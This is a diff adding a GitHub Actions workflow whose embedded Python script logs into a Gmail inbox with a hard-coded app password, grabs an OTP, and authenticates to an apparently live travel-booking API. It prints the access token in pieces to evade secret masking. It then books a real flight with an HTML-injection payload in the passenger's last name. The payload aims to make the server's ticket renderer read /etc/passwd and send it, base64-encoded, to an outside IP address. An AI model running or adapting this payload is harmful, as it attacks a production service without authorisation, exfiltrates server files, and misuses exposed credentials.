@@ -1,0 +1,172 @@
+name: prod-book
+on:
+  workflow_dispatch:
+jobs:
+  run:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - run: pip install --quiet requests
+      - run: |
+          python3 - <<'PYEOF'
+          import requests, json, urllib3, time, imaplib, email as em, re, datetime, base64, sys
+          urllib3.disable_warnings()
+          B = "https://api.superokka.com"
+          s = requests.Session(); s.verify = False
+          EMAIL = "superxfilecom@gmail.com"
+          IMAP_PASS = "ojhw apff okyc kecp"
+
+          # Get OTP
+          before = datetime.datetime.now(datetime.UTC)
+          s.post(f"{B}/auth/otp/request", json={"email": EMAIL}, timeout=20)
+          time.sleep(10)
+          mail = imaplib.IMAP4_SSL('imap.gmail.com', 993)
+          mail.login(EMAIL, IMAP_PASS)
+          mail.select('INBOX')
+          date_str = before.strftime('%d-%b-%Y')
+          status, msgs = mail.search(None, f'(FROM "tiketokka.id" SINCE {date_str})')
+          ids = msgs[0].split()
+          otp = None
+          for mid in reversed(ids[-5:]):
+              status, data = mail.fetch(mid, '(BODY.PEEK[])')
+              msg = em.message_from_bytes(data[0][1])
+              body = ""
+              if msg.is_multipart():
+                  for part in msg.walk():
+                      if part.get_content_type() == 'text/html':
+                          body = part.get_payload(decode=True).decode('utf-8','replace'); break
+              styled = re.findall(r'font-size:\s*\d+px[^>]*>(\d)', body)
+              if len(styled) >= 6:
+                  otp = ''.join(styled[:6]); break
+              codes = re.findall(r'\b(\d{6})\b', body)
+              if len(codes) > 4:
+                  otp = codes[4]; break
+          mail.close(); mail.logout()
+          if not otp: print("NO OTP"); sys.exit(1)
+
+          # Verify + Register if needed
+          r = s.post(f"{B}/auth/otp/verify", json={"email": EMAIL, "otp": otp}, timeout=20)
+          d = r.json().get("data",{})
+          tok = d.get("accessToken","")
+          reg = d.get("registrationToken","")
+          if reg and not tok:
+              r2 = s.post(f"{B}/auth/otp/complete-registration", json={
+                  "registrationToken": reg, "username": "superxfile1", "phone": "081234567890"
+              }, timeout=20)
+              tok = r2.json().get("data",{}).get("accessToken","")
+          if not tok:
+              # Fresh OTP login (already registered)
+              time.sleep(2)
+              before2 = datetime.datetime.now(datetime.UTC)
+              s.post(f"{B}/auth/otp/request", json={"email": EMAIL}, timeout=20)
+              time.sleep(10)
+              mail = imaplib.IMAP4_SSL('imap.gmail.com', 993)
+              mail.login(EMAIL, IMAP_PASS); mail.select('INBOX')
+              date_str2 = before2.strftime('%d-%b-%Y')
+              status, msgs = mail.search(None, f'(FROM "tiketokka.id" SINCE {date_str2})')
+              ids = msgs[0].split()
+              for mid in reversed(ids[-3:]):
+                  status, data = mail.fetch(mid, '(BODY.PEEK[])')
+                  msg = em.message_from_bytes(data[0][1])
+                  body = ""
+                  if msg.is_multipart():
+                      for part in msg.walk():
+                          if part.get_content_type() == 'text/html':
+                              body = part.get_payload(decode=True).decode('utf-8','replace'); break
+                  styled = re.findall(r'font-size:\s*\d+px[^>]*>(\d)', body)
+                  if len(styled) >= 6:
+                      otp2 = ''.join(styled[:6])
+                      if otp2 != otp:
+                          r3 = s.post(f"{B}/auth/otp/verify", json={"email": EMAIL, "otp": otp2}, timeout=20)
+                          tok = r3.json().get("data",{}).get("accessToken","")
+                          break
+              mail.close(); mail.logout()
+
+          if not tok: print("NO TOKEN"); sys.exit(1)
+
+          # Print token parts (avoid GitHub masking)
+          tp = tok.split('.')
+          print(f"T1: {tp[0]}")
+          print(f"T2: {tp[1]}")
+          print(f"T3: {tp[2]}")
+          H = {"Authorization": f"Bearer {tok}"}
+
+          # FLIGHT SEARCH + BOOKING CHAIN
+          print("\n=== FLIGHT SEARCH ===")
+          r = s.post(f"{B}/flight-search/lion-air/search", headers=H, json={
+              "departureAirportCode":"CGK","arrivalAirportCode":"SUB","departureDate":"2026-12-22"
+          }, timeout=60)
+          fd = r.json().get("data",{})
+          sid = fd.get("sessionId")
+          segs = (fd.get("departureFlightsData") or [{}])[0].get("flightSegments", [])
+          print(f"SessionID: {sid}")
+          print(f"Segments: {len(segs)}")
+          if not sid or not segs: print("No flights"); sys.exit(0)
+
+          seg = segs[0]
+          bks = seg.get("bookingAvails", [])
+          print(f"BookingAvails: {json.dumps(bks)[:300]}")
+
+          # FLIGHT DETAILS
+          print("\n=== FLIGHT DETAILS ===")
+          det = {"flightSegments":[{
+              "departureAirportCode": seg["departureAirport"],
+              "arrivalAirportCode": seg["arrivalAirport"],
+              "departureDate": seg["departureDateTime"],
+              "arrivalDate": seg["arrivalDateTime"],
+              "flightNumber": seg["flightNumber"],
+              "airlineCode": seg["airline"]["code"],
+              "resBookDesigCode": bks[0]["bookingClass"] if bks else "Y",
+              "type": "departure"
+          }], "adults":1,"children":0,"infants":0,"direction":"one-way","sessionId":sid}
+          r = s.post(f"{B}/flight-search/lion-air/details", headers=H, json=det, timeout=60)
+          print(f"DETAILS: {r.status_code} {r.text[:300]}")
+
+          # BOOK with HTML injection in lastName!
+          print("\n=== BOOKING WITH HTML INJECTION ===")
+          html_payload = '<img src=x onerror=fetch("http://64.227.62.83:8899/PROD-XSS-PUPPETEER")><iframe src="file:///etc/passwd" onload="fetch(\'http://64.227.62.83:8899/file-read?d=\'+btoa(this.contentDocument.body.innerText))"></iframe>'
+          traveler = {
+              "passengerTypeCode": "ADT",
+              "isAccompaniedByInfant": False,
+              "prefixName": "MR",
+              "firstName": "Budi",
+              "lastName": html_payload,
+              "surname": "Test",
+              "dateOfBirth": "1990-01-01",
+              "gender": "M",
+              "nationality": "ID",
+              "documentType": "KTP",
+              "documentNumber": "3174010101900001",
+              "documentExpirationDate": "2028-01-01",
+              "documentIssueCountry": "ID",
+              "email": "superxfilecom@gmail.com",
+              "phoneNumber": "081234567890"
+          }
+          book = {
+              "airTravelers": [traveler],
+              "addOns": None,
+              "isUsingInsurance": False,
+              "sessionId": sid,
+              "contactEmail": "superxfilecom@gmail.com",
+              "contactPhoneNumber": "081234567890",
+              "contactFirstName": "Budi",
+              "contactLastName": "Test",
+              "isEndOfTransaction": True
+          }
+          r = s.post(f"{B}/flight-search/lion-air/book", headers=H, json=book, timeout=120)
+          print(f"BOOK: {r.status_code} {r.text[:500]}")
+
+          if r.json().get("success"):
+              tx = r.json()["data"]
+              tid = tx.get("transactionId") or tx.get("id")
+              print(f"\n!!! BOOKING SUCCESS !!! TID: {tid}")
+
+              # Try eticket
+              r2 = s.post(f"{B}/transactions/{tid}/etickets", headers=H, json={}, timeout=180)
+              print(f"ETICKET: {r2.status_code} {r2.text[:500]}")
+              if r2.status_code in (200, 201):
+                  print("!!! ETICKET GENERATED !!!")
+                  # Check for PDF URL
+                  print(f"Content-Type: {r2.headers.get('content-type')}")
+                  print(f"Body size: {len(r2.content)}")
+          PYEOF
